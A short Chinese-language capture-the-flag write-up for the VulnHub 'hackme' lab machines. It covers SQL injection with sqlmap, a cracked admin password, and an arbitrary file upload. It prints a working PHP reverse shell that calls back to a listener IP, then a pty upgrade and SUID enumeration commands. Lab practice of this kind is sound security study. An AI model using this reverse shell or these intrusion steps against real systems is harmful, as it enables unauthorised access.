# vlunhub靶机 hackme



arp-scan 扫自己的网段找到靶机



## hackme：1

好简单，上去登录拉了，就注册了账号，之后是一个很简单的sqlmap的操作把admin的密码拖出来

![image-20211130124709409](https://gitee.com/yyssllz/pic/raw/master/image-20211130124709409.png)

somd5能到找密码为：Uncrackable

![image-20211130124959967](https://gitee.com/yyssllz/pic/raw/master/image-20211130124959967.png)



上去之后任意文件上传，为了方便操作写了个反弹shell：

```php
<?php
$sock = fsockopen("192.168.139.131", 1234);
$descriptorspec = array(
        0 => $sock,
        1 => $sock,
        2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
```



再用Python拿个bash交互比较顺心(当然弹的时候主要是sh大家都有)：

```python
python3 -c "import pty;pty.spawn('/bin/bash')"
```



之后home目录下有个

![image-20211130131317508](https://gitee.com/yyssllz/pic/raw/master/image-20211130131317508.png)

这样就行了，呃？为什么？没有明白这个是什么考点，不过这样就结束了





## hackme: 2

这出题人是真的懒，比起前面一个题目就多了一个SSTI的地方， 

具体操作是上传一个图片然后SSTI那里（我也不知道是不是SSTI，反正大概是用eval执行了）

![image-20211130210759354](https://gitee.com/yyssllz/pic/raw/master/image-20211130210759354.png)

包含自己的图片，然后反弹shell弹出来，



SUID:

```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```



![image-20211130210837907](https://gitee.com/yyssllz/pic/raw/master/image-20211130210837907.png)

打完收工